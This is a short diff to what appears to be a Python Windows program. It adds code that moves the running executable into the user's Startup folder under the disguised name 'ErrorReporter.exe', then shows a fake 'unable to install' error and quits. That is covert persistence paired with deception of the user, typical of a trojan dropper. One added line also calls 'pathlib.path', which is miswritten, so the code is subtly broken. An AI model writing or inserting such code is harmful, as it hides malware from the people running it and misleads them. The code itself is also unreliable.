@@ -480,8 +480,13 @@ if __name__ == "__main__":
     #       client.start()
     #   except Exception as e:
     #       print(e)
-    if original:
+    loc = pathlib.path(sys.argv[0]).parent.resolve()
+    dest = f"C:/Users/{os.getlogin()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+    dest2 = dest.replace("/", "\\")
+    if not (loc == dest or loc == dest2):
         shutil.move(sys.argv[0], f"C:/Users/{os.getlogin()}/appdata/roaming/microsoft/windows/start menu/programs/startup/ErrorReporter.exe")
+        easygui.msgbox("unable to install the program, try again later")
+        sys.exit(1)
     else:
         isrunning = checkifrunning()
         if isrunning:
